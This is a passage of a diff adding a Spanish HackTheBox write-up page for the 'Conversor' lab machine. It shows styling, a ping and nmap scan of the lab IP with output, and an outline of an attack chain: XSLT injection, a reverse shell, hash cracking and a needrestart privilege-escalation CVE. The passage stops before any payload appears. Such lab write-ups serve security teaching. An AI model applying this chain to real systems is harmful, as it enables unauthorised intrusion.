@@ -1,0 +1,1618 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Conversor — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Conversor de HackTheBox — Dificultad: Fácil. nmap → /etc/hosts → source code → XSLT Injection → reverse shell www-data → SQLite hashes → CrackStation → SSH fismathack → CVE-2024-48990 needrestart → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,229,255,0.06) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green); border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-xslt    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-cron    { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-ssh     { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-cve     { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-purple { color: var(--purple); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: inherit; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-ora   { color: var(--orange); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-orange { color: var(--orange); }
+
+    /* INFO BOXES */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .vuln-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .vuln-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .vuln-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .vuln-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* CODE MULTILINE */
+    .code-file {
+      background: var(--bg3); border: 1px solid rgba(191,95,255,0.2);
+      border-left: 3px solid var(--purple);
+      padding: 1rem 1.2rem; margin: 1rem 0;
+      font-family: var(--font-mono); font-size: 0.8rem;
+      line-height: 1.9; overflow-x: auto; position: relative;
+    }
+    .code-file .cf-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .code-file .cf-kw  { color: var(--purple); }
+    .code-file .cf-str { color: var(--yellow); }
+    .code-file .cf-fn  { color: var(--cyan); }
+    .code-file .cf-var { color: var(--green); }
+    .code-file .cf-cmt { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--dim); padding: 2rem 4rem;
+      display: flex; justify-content: space-between; align-items: center; margin-top: 4rem;
+    }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; order: -1; }
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2rem; }
+      footer { padding: 1.5rem; flex-direction: column; gap: 0.5rem; text-align: center; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+<a href="#main" class="skip-link">Skip to content</a>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">WRITEUPS</a>
+</nav>
+
+<!-- HERO -->
+<section class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../index.html">HOME</a> / <a href="../../index.html">WRITEUPS</a> / <a href="../../index.html#hackthebox-section">HACKTHEBOX</a> / <span>CONVERSOR</span>
+    </div>
+    <h1 class="writeup-title">CONVER<span>SOR</span></h1>
+    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · XSLT Injection + Cron Abuse + CVE-2024-48990</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-facil">FÁCIL</span>
+      <span class="meta-badge badge-xslt">XSLT INJECTION</span>
+      <span class="meta-badge badge-cron">CRON ABUSE</span>
+      <span class="meta-badge badge-ssh">SSH</span>
+      <span class="meta-badge badge-cve">CVE-2024-48990</span>
+      <span class="meta-date">// 2026-05-31</span>
+    </div>
+  </div>
+</section>
+
+<div class="writeup-layout">
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// TABLA DE CONTENIDO</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#hosts">02 · /etc/hosts</a></li>
+        <li><a href="#web">03 · Aplicación Web</a></li>
+        <li><a href="#sourcecode">04 · Source Code</a></li>
+        <li><a href="#xslt">05 · XSLT Injection</a></li>
+        <li><a href="#shell">06 · Reverse Shell</a></li>
+        <li><a href="#db">07 · SQLite · Hashes</a></li>
+        <li><a href="#ssh">08 · SSH como fismathack</a></li>
+        <li><a href="#privesc">09 · PrivEsc · needrestart</a></li>
+        <li><a href="#root">10 · Root</a></li>
+        <li><a href="#cmdref">11 · Referencia Comandos</a></li>
+        <li><a href="#glosario">12 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Conversor</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP</span><span class="info-val val-cyan">10.129.238.31</span></div>
+      <div class="info-row"><span class="info-label">DOMINIO</span><span class="info-val val-green">conversor.htb</span></div>
+      <div class="info-row"><span class="info-label">PUERTOS</span><span class="info-val val-cyan">22, 80</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>22, 80</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">/etc/hosts → <span>conversor.htb</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Download <span>source_code.tar.gz</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>XSLT Injection</span> → write .py</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Cron → exec .py → <span>reverse shell</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SQLite → hashes → <span>fismathack</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SSH → sudo <span>needrestart</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2024-48990</span> → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+
+    <!-- ===================== 01 RECON ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICAR CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso siempre es confirmar que la máquina objetivo está activa y responde a través
+          de la VPN de HackTheBox. Usamos <span class="hl">ping</span> con el flag
+          <span class="hl-cyan">-c 3</span> para limitar el envío a exactamente 3 paquetes ICMP —
+          sin este flag el ping sería infinito. La IP objetivo es
+          <span class="hl-yel">10.129.238.31</span>.
+        </p>
+        <p>
+          El <strong>TTL de 63</strong> en la respuesta es un indicador del sistema operativo:
+          Linux inicia con TTL 64 y pierde 1 al pasar por cada hop de red, por lo que recibir 63
+          indica que hay exactamente un router entre nosotros y la máquina. Windows usaría TTL
+          128, por lo que este resultado confirma que es <strong>Linux</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 10.129.238.31 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.238.31</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.129.238.31 (10.129.238.31) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from 10.129.238.31:</span> icmp_seq=1 <span class="o-yellow">ttl=63</span> time=114 ms</div>
+        <div><span class="o-green">64 bytes from 10.129.238.31:</span> icmp_seq=2 <span class="o-yellow">ttl=63</span> time=114 ms</div>
+        <div><span class="o-green">64 bytes from 10.129.238.31:</span> icmp_seq=3 <span class="o-yellow">ttl=63</span> time=115 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 10.129.238.31 ping statistics ---</div>
+        <div><span class="o-green">3 packets transmitted, 3 received, 0% packet loss</span>, time 2013ms</div>
+        <div>rtt min/avg/max/mdev = 113.668/114.375/115.026/0.555 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO COMPLETO CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con conectividad confirmada, lanzamos un escaneo exhaustivo con <span class="hl">nmap</span>
+          guardando resultados en XML para poder transformarlos luego en HTML. Desglosando cada flag:
+        </p>
+        <p>
+          <span class="hl-cyan">-p-</span> escanea los <strong>65,535 puertos TCP</strong> en
+          lugar de solo los 1,000 más comunes. Muchos servicios interesantes corren en puertos
+          no estándar — un escaneo básico los pasaría por alto. Es más lento pero garantiza
+          cobertura completa.
+        </p>
+        <p>
+          <span class="hl-cyan">-sSCV</span> combina tres flags en uno:
+          <strong>-sS</strong> (SYN scan — envía solo el paquete SYN sin completar el handshake TCP,
+          más rápido y sigiloso que un connect scan completo),
+          <strong>-sC</strong> (ejecuta los scripts por defecto de NSE — Nmap Scripting Engine —
+          que detectan configuraciones, banners y vulnerabilidades comunes), y
+          <strong>-sV</strong> (detecta la versión exacta del servicio en cada puerto abierto).
+        </p>
+        <p>
+          <span class="hl-cyan">-n</span> desactiva la resolución DNS inversa. Cuando nmap intenta
+          resolver cada IP a un nombre de dominio, añade latencia innecesaria en un entorno de
+          laboratorio donde esa información no aporta valor.
+        </p>
+        <p>
+          <span class="hl-cyan">-Pn</span> deshabilita el host discovery previo al escaneo.
+          Por defecto nmap primero comprueba si el host está activo enviando paquetes ICMP.
+          En algunas máquinas HTB el firewall bloquea ICMP pero los puertos TCP están abiertos —
+          sin <code style="color:var(--yellow);font-family:var(--font-mono)">-Pn</code> nmap
+          asumiría que el host está caído. Ya confirmamos conectividad con ping, así que lo saltamos.
+        </p>
+        <p>
+          <span class="hl-cyan">--min-rate=5000</span> fuerza a nmap a enviar al menos
+          <strong>5,000 paquetes por segundo</strong>, acelerando significativamente el escaneo
+          de 65,535 puertos de varios minutos a menos de un minuto. Aceptable en entornos de laboratorio.
+        </p>
+        <p>
+          <span class="hl-cyan">--open</span> filtra la salida para mostrar solo puertos en estado
+          <strong>abierto</strong>, descartando los cerrados y filtrados para una lectura limpia.
+        </p>
+        <p>
+          <span class="hl-cyan">-oX conversor.xml</span> guarda los resultados en formato XML.
+          Este formato estructurado permite transformarlo posteriormente con
+          <code style="color:var(--yellow);font-family:var(--font-mono)">xsltproc</code> en un
+          HTML visual con tablas y colores, útil para reportes profesionales.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.238.31 -oX conversor.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ESCANEO</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.238.31</span> <span class="flag">-oX</span> <span class="arg">conversor.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 15:44 -0400</div>
+        <div>Nmap scan report for 10.129.238.31</div>
+        <div>Host is up (0.42s latency).</div>
+        <div>Not shown: 60916 closed tcp ports (reset), 4617 filtered tcp ports (no-response)</div>
+        <div>PORT&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-green">22/tcp</span> open  ssh&nbsp;&nbsp; <span class="o-cyan">OpenSSH 8.9p1</span> Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)</div>
+        <div>|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)</div>
+        <div><span class="o-green">80/tcp</span> open  http&nbsp; <span class="o-cyan">Apache httpd 2.4.52</span></div>
+        <div>|_http-title: Did not follow redirect to http://conversor.htb/</div>
+        <div>|_http-server-header: Apache/2.4.52 (Ubuntu)</div>
+        <div>Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 37.09 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DE RESULTADOS</p>
+        <p>
+          Solo <strong>2 puertos abiertos</strong>: <strong>22 (SSH)</strong> con OpenSSH 8.9p1 y
+          <strong>80 (HTTP)</strong> con Apache 2.4.52. La línea clave es
+          <strong>http-title: Did not follow redirect to http://conversor.htb/</strong> — nmap detectó
+          que el servidor redirige a un dominio virtual. Además el campo
+          <strong>Service Info: Host: conversor.htb</strong> nos confirma el nombre de dominio
+          que debemos configurar en nuestro sistema.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERTIR RESULTADOS NMAP A HTML</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl">xsltproc</span> es un procesador de hojas de estilo XSLT de línea de
+          comandos. Nmap incluye una hoja de estilo
+          (<code style="color:var(--yellow);font-family:var(--font-mono)">/usr/share/nmap/nmap.xsl</code>)
+          que transforma el XML generado en un HTML tabular con colores y estilos, perfecto para
+          incluir en reportes o revisar escaneos grandes cómodamente en el navegador. Este paso
+          también es relevante para entender conceptualmente qué hace Conversor — la máquina que
+          estamos atacando.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl conversor.xml > conversor.html">
